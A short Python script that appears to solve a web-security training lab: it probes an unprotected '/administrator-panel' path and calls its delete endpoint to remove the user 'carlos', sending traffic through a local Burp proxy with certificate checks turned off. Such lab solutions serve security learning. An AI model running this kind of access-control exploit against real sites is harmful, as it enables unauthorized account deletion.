#!/usr/bin/env python3

import requests
import sys
import urllib3

# add some color for fun :)
red = '\033[31m'
green = '\033[32m'

# suppress insecure request warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# setup proxies var to funnel the script through burpsuite
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def delete_carlos(url):
    # set admin panel url (we found this by solving the lab and checking burp requests)
    admin_panel = url + '/administrator-panel'

    # make a GET request to admin_panel and use the proxy
    response = requests.get(admin_panel, verify=False, proxies=proxies)

    # if the request succeeds to admin_panel, delete carlos!
    if response.status_code == 200:
        print(f'{green} Admin panel found at {admin_panel}')
        print(f'{green} Deleting carlos...')

        # from burp we know that the request goes to "GET /administrator-panel/delete?username=carlos HTTP/2"
        delete_url = admin_panel + '/delete?username=carlos'
        response = requests.get(delete_url, verify=False, proxies=proxies) # this is a GET request!

        # if the request is successful, let the user know
        if response.status_code == 200:
            print(f'{green} User carlos deleted successfully!')

        # otherwise, print an error
        else:
            print(f'{red} Carlos was not deleted, try again!')

    # warn the user that the admin_panel was not found
    else:
        print(f'{red} Admin panel was not found! Try again!')


def main():
    # check arg length - if not correct, print error and exit
    if len(sys.argv) != 2:
        print(f'{red} Usage: {sys.argv[0]} <url>')
        sys.exit(1)
    # otherwise, call the delete_carlos() function with the url supplied as argument
    else:
        url = sys.argv[1]
        delete_carlos(url)


if __name__ == "__main__":
    main()
